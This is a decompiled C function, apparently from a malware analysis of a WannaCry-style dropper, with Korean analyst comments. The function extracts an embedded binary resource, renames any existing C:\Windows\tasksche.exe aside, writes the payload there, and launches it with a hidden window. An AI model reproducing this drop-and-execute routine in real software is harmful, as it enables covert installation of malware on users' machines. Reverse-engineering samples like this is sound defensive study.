// --- Metadata ---
// Function Name: extractResourceAndExecuteTasksche_407CE0
// Address: 0x407CE0
// Exported At: 20250528_133509
// Signature: unknown_signature
// ---------------
int extractResourceAndExecuteTasksche_407CE0()
{
  HMODULE v0; // eax
  HMODULE v1; // esi
  BOOL (__stdcall *CloseHandle)(HANDLE); // eax
  HRSRC v3; // eax
  HRSRC v4; // esi
  HGLOBAL v5; // eax
  DWORD v6; // ebp
  HANDLE v7; // esi
  LPCVOID lpBuffer; // [esp+5Ch] [ebp-260h] BYREF
  struct _PROCESS_INFORMATION ProcessInformation; // [esp+60h] [ebp-25Ch] BYREF
  struct _STARTUPINFOA StartupInfo; // [esp+70h] [ebp-24Ch] BYREF
  char Buffer; // [esp+B4h] [ebp-208h] BYREF
  char v13[256]; // [esp+B5h] [ebp-207h] BYREF
  __int16 v14; // [esp+1B5h] [ebp-107h]
  char v15; // [esp+1B7h] [ebp-105h]
  CHAR NewFileName; // [esp+1B8h] [ebp-104h] BYREF
  char v17[256]; // [esp+1B9h] [ebp-103h] BYREF
  __int16 v18; // [esp+2B9h] [ebp-3h]
  char v19; // [esp+2BBh] [ebp-1h]

  v0 = GetModuleHandleW(&ModuleName);           // 리소스에서 바이너리 데이터를 추출하여 C:\Windows\tasksche.exe에 저장한 뒤 실행
  v1 = v0;
  if ( v0 )
  {
    CreateProcessA = GetProcAddress(v0, ProcName);
    CreateFileA_0 = GetProcAddress(v1, aCreatefilea);
    WriteFile = GetProcAddress(v1, aWritefile);
    CloseHandle = GetProcAddress(v1, aClosehandle);
    dword_43144C = CloseHandle;
    if ( CreateProcessA )
    {
      if ( CreateFileA_0 )
      {
        if ( WriteFile )
        {
          if ( CloseHandle )
          {
            v3 = FindResourceA(0, 1831, Type);
            v4 = v3;
            if ( v3 )
            {
              v5 = LoadResource(0, v3);
              if ( v5 )
              {
                lpBuffer = LockResource(v5);
                if ( lpBuffer )
                {
                  v6 = SizeofResource(0, v4);
                  if ( v6 )
                  {
                    Buffer = 0;
                    memset(v13, 0, sizeof(v13));
                    v14 = 0;
                    v15 = 0;
                    NewFileName = 0;
                    memset(v17, 0, sizeof(v17));
                    v18 = 0;
                    v19 = 0;
                    sprintf(&Buffer, "C:\\%s\\%s", aWindows, aTaskscheExe);
                    sprintf(&NewFileName, "C:\\%s\\qeriuwjhrf", aWindows);// 기존의 tasksche.exe가 있을 경우 백업처럼 qeriuwjhrf라는 이름으로 이동 
                    MoveFileExA(&Buffer, &NewFileName, 1u);
                    v7 = CreateFileA_0(&Buffer, 0x40000000u, 0, 0, 2u, 4u, 0);
                    if ( v7 != -1 )
                    {
                      WriteFile(v7, lpBuffer, v6, &lpBuffer, 0);
                      dword_43144C(v7);
                      ProcessInformation.hThread = 0;
                      ProcessInformation.dwProcessId = 0;
                      ProcessInformation.dwThreadId = 0;
                      memset(&StartupInfo.lpReserved, 0, 0x40u);
                      ProcessInformation.hProcess = 0;
                      strcat(&Buffer, &off_431340);
                      StartupInfo.cb = 'D';
                      StartupInfo.wShowWindow = 0;
                      StartupInfo.dwFlags = 129;
                      if ( CreateProcessA(0, &Buffer, 0, 0, 0, 0x8000000u, 0, 0, &StartupInfo, &ProcessInformation) )
                      {
                        dword_43144C(ProcessInformation.hThread);
                        dword_43144C(ProcessInformation.hProcess);
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
  return 0;
}
